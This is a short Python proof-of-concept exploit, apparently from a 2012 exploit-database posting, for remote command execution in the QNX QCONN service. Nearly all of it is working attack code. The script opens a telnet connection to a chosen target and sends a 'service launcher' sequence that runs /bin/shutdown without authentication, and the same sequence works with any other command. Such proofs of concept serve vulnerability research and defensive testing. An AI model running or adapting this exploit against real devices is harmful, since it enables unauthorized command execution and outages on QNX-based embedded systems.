# Title : QNX QCONN Remote Command Execution Vurnerability
# Version : QNX 6.5.0 >= , QCONN >= 1.4.207944
# Download: http://www.qnx.com/download/feature.html?programid=23665 (QNX Neutrino 6.5.0 SP1)
# Vendor : http://www.qnx.com
# Date : 2012/09/09
# CVE : N/A
# Exploit Author : Mor!p3r(moriper[at]gmail.com)

import telnetlib
import sys

if len(sys.argv) < 3:
  print " "
  print " -----------------------------------------------------"
  print " + Qconn Remote Command Execution PoC (Shutdown) +"
  print " -----------------------------------------------------"
  print " "
  print " + Usage: QCONNRC.py <Target IP> <Port>"
  print "    + Ex> QCONNRC.py 192.168.0.1 8000"
  print ""
  sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
attack ="service launcher\n" + "start/flags 8000 /bin/shutdown /bin/shutdown -b\n" + "continue\n"
telnet = telnetlib.Telnet(host, port)
telnet.write(attack)
print "[+] Finish"
telnet.close()